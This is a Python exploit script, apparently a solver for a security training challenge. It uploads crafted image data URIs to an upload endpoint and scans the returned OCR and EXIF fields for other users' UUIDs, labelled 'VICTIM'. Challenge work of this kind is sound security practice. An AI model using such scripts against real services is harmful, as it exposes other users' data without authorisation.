import requests, re
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
UURE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
for name in ["e1","e2","e3","e4"]:
    uri = open(name+"_datauri.txt").read().strip()
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":"E_"+name,"user_id":UID})
    print(f"{name} -> {r.status_code}")
data = requests.get(f"{BASE}/images/{UID}").json()
print()
for img in data:
    if str(img.get("description","")).startswith("E_"):
        ocr=img.get("summary_ocr","")
        foreign=[u for u in UURE.findall(str(ocr)) if u!=UID]
        print(f"{img['description']}: ocr={ocr!r}" + (f"   <<< UUID {foreign}" if foreign else ""))
# global leak scan
seen=set()
for img in data:
    for fld in ("summary_ocr","make","model","datetime"):
        for m in UURE.findall(str(img.get(fld,""))):
            if m!=UID: seen.add(m)
if seen: print("\nVICTIM uuid candidate(s):", seen)
